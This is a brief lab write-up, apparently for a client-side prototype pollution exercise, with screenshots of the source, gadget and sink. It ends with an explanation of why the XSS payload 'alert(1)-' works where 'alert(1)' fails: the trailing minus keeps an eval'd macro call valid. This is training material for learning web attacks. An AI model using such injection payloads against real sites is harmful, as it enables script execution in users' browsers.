## Lab Description :

<img width="912" height="484" alt="image" src="https://github.com/user-attachments/assets/4598f558-d910-49b1-adba-a4ee04b250b5" />

## Solution :

### Identifying source -

<img width="1919" height="696" alt="image" src="https://github.com/user-attachments/assets/666d0a46-e2de-415e-9f10-834b2f46b7f5" />



### Identifying gadget - 

<img width="1822" height="652" alt="image" src="https://github.com/user-attachments/assets/6d577503-c613-4676-9342-4e2173197579" />

### Identifying sink -

<img width="1903" height="956" alt="image" src="https://github.com/user-attachments/assets/628e94a8-060b-4ddf-8799-255b0db744d2" />

<img width="1059" height="616" alt="image" src="https://github.com/user-attachments/assets/ebfbb612-2716-4742-b5fa-69686c9f810b" />

<img width="1475" height="398" alt="image" src="https://github.com/user-attachments/assets/04969486-b46e-4434-a2bc-1f9a33989894" />

Why alert(1) alone failed:

The sink does `a + 1` where a is the polluted string, then evals `manager.macro(<result>)`.

```js
"alert(1)" + 1 → "alert(1)1"
eval("...manager.macro(alert(1)1)...")   // SyntaxError — "1" right after ")" is invalid JS
```

Why trailing - fixes it:

```js
"alert(1)-" + 1 → "alert(1)-1"
eval("...manager.macro(alert(1)-1)...")  // valid: alert(1) runs, then undefined - 1 = NaN
```
The `-` turns the stray appended 1 into a subtraction operator instead of a dangling digit, so the evald code parses correctly and alert(1) actually executes as a side effect before the (meaningless) subtraction happens.



